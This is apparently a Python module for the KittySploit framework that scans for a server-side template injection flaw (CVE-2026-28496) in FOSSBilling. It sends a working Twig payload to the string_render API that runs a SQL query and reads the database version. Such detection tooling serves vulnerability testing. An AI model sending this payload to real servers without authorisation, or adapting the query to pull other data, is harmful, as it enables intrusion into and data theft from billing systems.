#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FOSSBilling - Server-Side Template Injection"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "FOSSBilling - Server-Side Template Injection",
        "description": (
            "FOSSBilling string_render API evaluates unsandboxed Twig, allowing "
            "SQL/info disclosure via guest.getDi().db.getCell."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-28496",
        "tags": ["web", "scanner", "cve", "cve2026", "vuln", "fossbilling", "ssti", "rce", "vkev"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
        },
        "references": [
            "https://www.vulncheck.com/blog/fossbilling-auth-bypass-ssti-rce",
            "https://github.com/FOSSBilling/FOSSBilling/security/advisories/GHSA-57mv-jm88-66jc",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-28496",
        ],
    }

    def run(self):
        # Keep Twig braces literal in the JSON body.
        data = (
            '{"_tpl":"{{ guest.getDi().db.getCell(\\"SELECT @@version\\") }}",'
            '"_try":false}'
        )
        r = self.http_request(
            method="POST",
            path="/api/system/system/string_render",
            headers={"Content-Type": "application/json"},
            data=data,
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        ctype = (r.headers.get("Content-Type") or r.headers.get("content-type") or "").lower()
        if "application/json" not in ctype:
            return False
        if '{"result":"' not in body and '"result":' not in body:
            return False
        if not re.search(r"[0-9]+\.[0-9]+\.[0-9]+", body):
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2026-28496",
            reason="FOSSBilling string_render executed Twig SSTI and returned DB version",
            path="/api/system/system/string_render",
            confidence="high",
        )
        return True
